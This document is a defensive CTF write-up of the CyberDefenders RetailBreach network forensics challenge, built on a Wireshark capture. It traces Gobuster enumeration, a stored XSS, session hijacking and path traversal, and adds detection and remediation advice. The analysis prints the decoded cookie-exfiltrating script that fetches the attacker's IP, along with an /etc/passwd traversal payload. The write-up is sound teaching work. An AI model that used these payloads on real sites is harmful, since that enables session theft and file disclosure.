\# RetailBreach — Network Forensics Investigation



!\[Platform](https://img.shields.io/badge/Platform-CyberDefenders-0A66C2)

!\[Category](https://img.shields.io/badge/Category-Network%20Forensics-6f42c1)

!\[Tool](https://img.shields.io/badge/Primary%20Tool-Wireshark-1679A7)

!\[Status](https://img.shields.io/badge/Status-Completed-brightgreen)



\## Overview



This write-up documents my investigation of the \*\*RetailBreach\*\* challenge on CyberDefenders. The capture follows the compromise of ShopSphere, an online retail platform that received unusual administrative logins and customer complaints about account anomalies.



The traffic revealed a connected attack chain rather than a single isolated event: the attacker enumerated the web application, planted a stored cross-site scripting payload, stole an administrator's session cookie, reused the session to access protected pages, and exploited a path traversal vulnerability to read a sensitive Linux file.



> The goal of this write-up is to show the investigation process and the evidence behind each conclusion, not only the final answers.



\## Investigation Objectives



\- Identify the attacker and the affected web server.

\- Determine which tool performed directory brute-forcing.

\- Recover and understand the XSS payload.

\- Establish when the administrator triggered the stored payload.

\- Identify and verify reuse of the stolen session token.

\- Determine which server-side script was vulnerable.

\- Recover the path traversal payload and confirm its impact.



\## Tools Used



\- \*\*Wireshark\*\* — endpoint analysis, HTTP filtering, stream reconstruction, timestamp review, and payload inspection.

\- \*\*MITRE ATT\&CK\*\* — behavioral technique mapping.



\## Initial Traffic Triage



I began with \*\*Statistics → Endpoints → IPv4\*\* to understand the systems present in the capture. Three IPv4 addresses were involved:



!\[RetailBreach PCAP overview](images/01-pcap-overview.png)



| Observed role | IP address |

|---|---|

| ShopSphere web server | `73.124.17.52` |

| Attacker | `111.224.180.128` |

| Administrator workstation | `135.143.142.5` |



!\[IPv4 endpoints](images/02-ipv4-endpoints.png)



The two busiest addresses exchanged similar packet volumes, so volume alone was not enough to label either endpoint as malicious. I filtered for HTTP requests and examined the direction and behavior of the traffic.



```wireshark

http.request

```



Requests from both clients were directed to `73.124.17.52` on TCP port `80`, establishing it as the ShopSphere web server. The host at `135.143.142.5` showed normal browsing and authenticated administrative activity. In contrast, `111.224.180.128` generated automated requests to many different paths and later performed the confirmed exploitation activity.



!\[HTTP request overview](images/03-http-requests-overview.png)



\## Finding 1 — Attacker Identification and Web Enumeration



I isolated HTTP requests from the suspicious client:



```wireshark

ip.src == 111.224.180.128 \&\& http.request

```



Following one of the HTTP streams revealed:



```http

User-Agent: gobuster/3.6

```



The client made rapid requests to many different paths, including random or wordlist-derived names. Many requests received `404 Not Found` responses. This combination—automated timing, varied paths, repeated failures, and the explicit user agent—confirmed directory brute-forcing with \*\*Gobuster\*\*.



!\[Gobuster directory brute-force stream](images/04-gobuster-directory-bruteforce.png)



\*\*Finding:\*\* The attacker operated from `111.224.180.128` and used `Gobuster 3.6` for web content discovery.



\## Finding 2 — Stored XSS Injection



To locate JavaScript submitted by the attacker, I searched the attacker's HTTP traffic for the word `script`:



```wireshark

ip.src == 111.224.180.128 \&\& http contains "script"

```



Most matches were harmless Gobuster probes for paths such as `/script` or `/javascript`. The important exception was a form submission to the reviews page:



```http

POST /reviews.php HTTP/1.1

Content-Type: application/x-www-form-urlencoded

```



The `review` form field contained a URL-encoded JavaScript payload. After decoding it, the payload was:



```html

<script>fetch('http://111.224.180.128/' + document.cookie);</script>

```



!\[Stored XSS payload in the review form](images/05-xss-payload-post-request.png)



This is a \*\*stored XSS\*\* payload. The attacker submitted it as a product review so the application would store it. When another user opened the affected page, their browser would execute the script in the context of ShopSphere.



The script reads cookies available through `document.cookie` and appends them to a request sent to the attacker's IP address. In this case, the target was the administrator's PHP session identifier.



\## Finding 3 — Administrator Triggered the Payload



The administrator's visits to the affected page were isolated with:



```wireshark

http.request \&\& ip.src == 135.143.142.5 \&\& http.request.uri contains "reviews.php"

```



Two visits appeared:



| Frame | UTC timestamp | Context |

|---:|---|---|

| `61` | `2024-03-29 11:50:53` | Before the malicious review was submitted |

| `10106` | `2024-03-29 12:09:50` | First visit after the XSS injection |



!\[Administrator visits to the reviews page](images/06-admin-reviews-visits-utc.png)



The XSS submission occurred before frame `10106`, making that request the first administrator visit capable of executing the stored payload.



\*\*Finding:\*\* The administrator first visited the compromised page at `2024-03-29 12:09:50 UTC`.



\## Finding 4 — Session Cookie Theft and Reuse



Frame `10106` contained the administrator's authenticated session cookie:



```http

Cookie: PHPSESSID=lqkctf24s9h9lg67teu8uevn3q

```



!\[Administrator session cookie](images/07-admin-session-cookie.png)



I then searched for cookie-bearing requests from the attacker after the administrator triggered the payload:



```wireshark

ip.src == 111.224.180.128 \&\& frame.number > 10106 \&\& http.cookie

```



The attacker reused the same `PHPSESSID` and accessed protected administrative routes, including:



```text

/admin/dashboard.php

/admin/review\_manager.php

/admin/log\_viewer.php

```



!\[Attacker reusing the stolen administrator session](images/08-attacker-session-reuse.png)



The cookie value itself does not contain a visible role. The administrative privilege was established through context: the original owner authenticated and accessed protected admin pages, and the attacker later used the same session identifier to access those routes successfully. This is \*\*session hijacking\*\* through a stolen web session cookie.



\## Finding 5 — Path Traversal in the Log Viewer



After hijacking the administrator's session, the attacker interacted repeatedly with:



```text

/admin/log\_viewer.php

```



The final request supplied an unusual value to the `file` parameter:



```http

GET /admin/log\_viewer.php?file=../../../../../etc/passwd HTTP/1.1

```



!\[Path traversal request](images/09-log-viewer-path-traversal.png)



Each `../` moves one directory level upward. Repeating it allowed the attacker to escape the application's intended log directory and request `/etc/passwd` from the underlying Linux filesystem.



Following the HTTP stream showed both:



```http

HTTP/1.1 200 OK

```



and recognizable `/etc/passwd` entries such as:



```text

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

```



!\[Successful disclosure of the passwd file](images/10-path-traversal-response.png)



The response content—not the `200 OK` status alone—confirmed that the path traversal succeeded. The file disclosed local account metadata; modern Linux systems normally store password hashes separately in `/etc/shadow`.



\## Reconstructed Attack Chain



1\. The attacker at `111.224.180.128` enumerated ShopSphere with Gobuster.

2\. The attacker identified the public review functionality.

3\. A stored XSS payload was submitted through `POST /reviews.php`.

4\. The administrator at `135.143.142.5` later opened the affected page.

5\. The browser executed the stored JavaScript and exposed the administrator's session cookie.

6\. The attacker reused the stolen `PHPSESSID` to hijack the authenticated session.

7\. The hijacked session provided access to protected administrative pages.

8\. The attacker exploited the `file` parameter in `log\_viewer.php` with a path traversal payload.

9\. The server returned the contents of `/etc/passwd`, confirming sensitive-file disclosure.



```text

Directory Enumeration

&#x20;       ↓

Stored XSS Injection

&#x20;       ↓

Administrator Visits the Page

&#x20;       ↓

Session Cookie Theft

&#x20;       ↓

Session Hijacking

&#x20;       ↓

Administrative Access

&#x20;       ↓

Path Traversal

&#x20;       ↓

/etc/passwd Disclosure

```



\## Key Indicators and Evidence



| Type | Value |

|---|---|

| Attacker IP | `111.224.180.128` |

| Web server IP | `73.124.17.52` |

| Administrator IP | `135.143.142.5` |

| Enumeration tool | `Gobuster 3.6` |

| XSS endpoint | `/reviews.php` |

| Stolen cookie name | `PHPSESSID` |

| Stolen session token | `lqkctf24s9h9lg67teu8uevn3q` |

| First post-injection admin visit | `2024-03-29 12:09:50 UTC` |

| Vulnerable script | `log\_viewer.php` |

| Vulnerable parameter | `file` |

| Path traversal payload | `../../../../../etc/passwd` |

| Exposed file | `/etc/passwd` |



\## MITRE ATT\&CK Mapping



| Tactic | Technique | Evidence |

|---|---|---|

| Reconnaissance | \[T1595.003 — Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003/) | Gobuster probed many candidate web paths. |

| Initial Access | \[T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | The public review function accepted and stored executable JavaScript. |

| Credential Access | \[T1539 — Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/) | The XSS payload collected the administrator's session cookie. |

| Defense Evasion / Lateral Movement | \[T1550.004 — Web Session Cookie](https://attack.mitre.org/techniques/T1550/004/) | The attacker reused the stolen cookie instead of authenticating normally. |

| Collection | \[T1005 — Data from Local System](https://attack.mitre.org/techniques/T1005/) | Path traversal exposed `/etc/passwd`. |



\## Detection Opportunities



\- Alert on one client generating a high rate of requests to many unique paths, especially when most responses are `404`.

\- Detect known automation user agents such as `gobuster`, while remembering that user-agent strings can be changed.

\- Monitor reviews, comments, and other stored fields for `<script>`, event handlers, suspicious URL encoding, and outbound URLs.

\- Alert when authenticated sessions are used from a new IP address or a different user-agent shortly after normal activity.

\- Detect a single `PHPSESSID` used by multiple source IPs within a short period.

\- Monitor direct access to sensitive administrative routes from unfamiliar hosts.

\- Alert on traversal sequences such as `../`, encoded variations such as `%2e%2e%2f`, and requests for files like `/etc/passwd`.

\- Correlate web access logs, authentication events, WAF alerts, and session telemetry to reconstruct the full chain.



\## Remediation Recommendations



\### Stored XSS



\- Apply context-aware output encoding before rendering user-controlled content.

\- Sanitize stored rich-text input with a maintained allowlist-based sanitizer.

\- Deploy a restrictive Content Security Policy as defense in depth.

\- Set session cookies with `HttpOnly`, `Secure`, and an appropriate `SameSite` policy.

\- Use HTTPS across the entire application.



`HttpOnly` would prevent JavaScript from reading the session cookie directly, but it would not remove the XSS vulnerability or stop every action that malicious JavaScript could perform in the victim's browser.



\### Session Management



\- Rotate the session identifier after authentication and privilege changes.

\- Expire sessions quickly and invalidate them after logout or suspicious activity.

\- Require reauthentication for high-impact administrative actions.

\- Detect abrupt changes in IP address, device characteristics, or user-agent for active privileged sessions.



\### Path Traversal



\- Never concatenate untrusted input directly into filesystem paths.

\- Map user choices to server-side allowlisted filenames or identifiers.

\- Canonicalize the requested path and verify that it remains inside the approved base directory.

\- Run the web service with least filesystem privilege.

\- Prevent the application account from reading files it does not require.



\### Enumeration Resistance



\- Apply rate limiting and behavioral detection to repeated invalid-path requests.

\- Restrict administrative interfaces by network location or trusted access controls.

\- Return consistent error responses that do not disclose unnecessary application details.



\## Lessons Learned



The most important lesson from this investigation was not to identify an attacker from packet volume alone. The strongest attribution came from behavior: automated enumeration, injection of active content, reuse of a privileged session, and exploitation of a vulnerable file parameter.



The incident also demonstrates how several individually recognizable weaknesses can form one damaging chain. The XSS vulnerability enabled cookie theft, the weak session controls enabled impersonation, and the path traversal flaw turned that access into operating-system information disclosure.



\## References



\- \[CyberDefenders — RetailBreach](https://cyberdefenders.org/blueteam-ctf-challenges/retailbreach/)

\- \[MITRE ATT\&CK — Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003/)

\- \[MITRE ATT\&CK — Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/)

\- \[MITRE ATT\&CK — Web Session Cookie](https://attack.mitre.org/techniques/T1550/004/)

\- \[OWASP — Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html)

\- \[OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path\_Traversal)



\---



\*\*Author:\*\* Alaa Zahra  

\*\*Platform:\*\* CyberDefenders  

\*\*Category:\*\* Network Forensics / Web Attack Investigation



> All IP addresses, tokens, and artifacts shown here belong to an authorized training environment.



